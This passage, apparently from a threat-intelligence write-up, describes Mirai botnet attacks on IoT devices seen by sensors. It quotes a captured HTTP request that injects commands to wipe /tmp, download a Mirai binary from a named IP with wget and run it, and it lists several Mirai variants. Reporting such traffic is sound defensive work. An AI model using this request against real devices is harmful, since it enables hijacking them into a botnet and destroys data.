@@ -1,0 +1,8 @@
+
+Using these sensors, we see attacks that range from simple IoT device attacks, such as this attack targeting a common Digital Video Recorder using the Mirai botnet.
+GET /shell?cd+/tmp;rm+-rf+*;wget+192.3.67.106/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.
+Rep.Jaws HTTP/1.1 User-Agent: Hello, world Host:
+127.0.0.1:80 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Connection: keep-alive
+Currently, Mirai is one of the most common botnets we are seeing attack IoT devices.
+  Variants of Mirai have developed with over 70 different vulnerabilities and rising.
+Some popular variants like Okiru, Masuta and IoTroop (and, most recently, SORA, UNSTABle Hoaxcall or Mirai XTC) are making the rounds.
